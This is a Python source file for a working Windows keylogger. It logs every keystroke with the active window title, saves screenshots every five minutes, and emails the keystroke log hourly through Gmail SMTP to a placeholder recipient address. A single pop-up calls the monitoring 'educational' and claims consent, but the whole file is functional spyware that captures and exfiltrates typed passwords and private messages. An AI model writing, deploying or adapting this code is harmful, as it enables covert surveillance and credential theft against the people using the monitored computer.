from pynput import keyboard
from datetime import datetime
import psutil
import pygetwindow as gw
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PIL import ImageGrab
import ctypes

def show_consent_message():
    message = "This computer is being monitored for educational purposes. By using this computer, you consent to keylogging."
    ctypes.windll.user32.MessageBoxW(0, message, "Consent", 1)

def get_active_window():
    try:
        window = gw.getActiveWindow()
        return window.title
    except Exception as e:
        return "Unknown"

def on_press(key):
    active_window = get_active_window()
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{datetime.now()} [{active_window}]: {key.char}\n")
    except AttributeError:
        with open("log.txt", "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(f"{datetime.now()} [{active_window}]: [SPACE]\n")
            else:
                log_file.write(f"{datetime.now()} [{active_window}]: [{key}]\n")

def send_email():
    from_email = "your_email@gmail.com"
    to_email = "recipient_email@example.com"
    subject = "Keylogger Logs"
    body = ""

    # Read log file
    with open("log.txt", "r") as log_file:
        body = log_file.read()

    # Create the email
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # Send the email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, "your_app_password_or_email_password")
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def periodic_email(interval):
    while True:
        send_email()
        threading.Event().wait(interval)

def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")

def periodic_screenshot(interval):
    while True:
        capture_screenshot()
        threading.Event().wait(interval)

# Show consent message
show_consent_message()

# Start the email thread
email_thread = threading.Thread(target=periodic_email, args=(3600,)) # Send email every hour
email_thread.daemon = True
email_thread.start()

# Start the screenshot thread
screenshot_thread = threading.Thread(target=periodic_screenshot, args=(300,)) # Capture screenshot every 5 minutes
screenshot_thread.daemon = True
screenshot_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
